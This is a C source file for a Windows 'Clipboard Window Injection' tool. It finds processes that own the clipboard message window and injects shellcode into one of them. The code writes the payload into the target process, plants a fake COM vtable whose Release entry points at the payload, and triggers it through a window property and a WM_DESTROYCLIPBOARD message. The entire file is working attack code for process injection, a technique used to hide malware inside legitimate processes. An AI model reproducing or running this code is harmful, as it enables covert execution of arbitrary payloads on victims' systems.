#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include "lib.h"
#include "shellcode.h"

VOID GetProcessName(DWORD pid, __out char* processname)
{

    HANDLE hSnap = NULL;
    BOOL fResult = FALSE;
    PROCESSENTRY32 pe32;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        pe32.dwSize = sizeof(PROCESSENTRY32);

        fResult = Process32First(hSnap, &pe32);

        while (fResult)
        {
            if (pe32.th32ProcessID == pid)
            {
                mycopy(processname, pe32.szExeFile, mystrlen(pe32.szExeFile));
                break;
            }
            fResult = Process32Next(hSnap, &pe32);
        }
        CloseHandle(hSnap);
    }
    // printf("Process Name Found is %s \n", processname);
    return;

}

VOID get_enum_window()
{
    HWND h_window = NULL;
    DWORD seen_pids[256] = { 0 };
    int seen_count = 0;

    while (TRUE)
    {
        
        h_window = FindWindowExA(HWND_MESSAGE, h_window, "CLIPBRDWNDCLASS", NULL);
        if (h_window == NULL)
        {
            break;
        }
        

        // To Enumerate the PID from the Window Handle
        DWORD pid;
        GetWindowThreadProcessId(h_window, &pid);
        // printf("[+] The Process ID that have the Class Window CLIPBRDWNDCLASS is : %d \n", pid);
        
        
        // Avoiding the Duplicate 
        BOOL already_seen = FALSE;
        for (int i = 0; i < seen_count; i++)
        {
            if (seen_pids[i] == pid)
            {
                already_seen = TRUE;
                break;
            }
        }
        if (already_seen)
        {
            continue;   
        }
        
        seen_pids[seen_count++] = pid;

        // Enumrate Process Name
        char processname[MAX_PATH] = { 0 };
        GetProcessName(pid, processname);
        printf("[+] %-20s PID : %d \n", processname, pid);

    }   
    
}

struct { 
    ULONG_PTR lpVtbl;
    ULONG_PTR QueryInterface;
    ULONG_PTR AddRef;
    ULONG_PTR Release;
} vtable_struct = {0};

VOID inject_clip()
{
    HANDLE h_window = NULL;
    h_window = FindWindowExA(HWND_MESSAGE, h_window, "CLIPBRDWNDCLASS", NULL);
    if (h_window == NULL)
    {
        printf("Couldn't found CLIPBRDWNDCLASS \n");
    }
    else
    {
       printf("The Handle of the Process is : 0x%p \n", h_window);
    }

    DWORD pid = 0;
    GetWindowThreadProcessId(h_window, &pid);
    printf("[+] The Process ID that have the Class Window CLIPBRDWNDCLASS is : %d \n", pid);

    HANDLE proc_handle = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION , 0, pid);
    if (proc_handle == NULL)
    {
        printf("The process Handle in Invaild");
    }
    
    printf("0x%p \n", proc_handle);

    LPVOID rem_mem = VirtualAllocEx(proc_handle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (rem_mem == NULL)
    {
        printf("[-] Failed to Allocate Memory in remote process: %d \n", GetLastError());
    }
    
    printf("[+] The allocated region is: 0x%p \n", rem_mem);

    SIZE_T bytesWritten_s;
    if ( !WriteProcessMemory(proc_handle, rem_mem, shellcode, sizeof(shellcode), &bytesWritten_s))
    {
        printf("[-] Failed to write the Shellcode to the memory %d \n", GetLastError());
    }
    
    // getchar();

    LPVOID struct_mem = VirtualAllocEx(proc_handle, NULL, sizeof(vtable_struct), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // lpVtbl points to itself + 8 (the vtable entries start after lpVtbl)
    vtable_struct.lpVtbl = (ULONG_PTR)struct_mem + sizeof(ULONG_PTR);
    vtable_struct.Release = (ULONG_PTR)rem_mem;

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory(proc_handle, struct_mem, &vtable_struct, sizeof(vtable_struct), &bytesWritten))
    {
        printf("[-] Failed to write the Shellcode to the memory %d \n", GetLastError());
    }

    printf("[+] The Shellcode has being copied to the remote process \n");

    DWORD old;
    if ( !VirtualProtectEx(proc_handle, rem_mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old))
    {
        printf("Failed to change the protection: %d \n", GetLastError());
    }
    
    printf("[+] Converted RW to RX \n");

    // getchar();

    if ( !SetPropA(h_window, "ClipboardDataObjectInterface", struct_mem))
    {
        printf("[-] SetProA failed: %d \n", GetLastError());
        return;
    }

    printf("[+] Propertyt set on window \n");

    printf("[+] Triggering clipboard update...");

    PostMessageA(h_window, WM_DESTROYCLIPBOARD, 0, 0);
    CloseHandle(proc_handle);

}

int main(int argc, char *argv[])
{
    printf("[+] Clipboard Window Injection \n");\

    if (argc < 2)
    {
        printf("\nUsage : %s <injection_type>\n\n", argv[0]);
        printf("Option 1: %s enum_clip \n\n", argv[0]);
        printf("Option 2: %s inject_clip \n\n", argv[0]);
        return 0;
    }

    printf("[+] Selected Argument is %s \n", argv[1]);

    if (strcmp(argv[1], "enum_clip") == 0)
    {
        printf("------------ Enumerating Clip Window ------------ \n");
        get_enum_window();
    }

    else if (strcmp(argv[1], "inject_clip") == 0)
    {
        printf("------------ Injecting Clip Window ------------ \n");
        inject_clip();
    }

    return 0;
}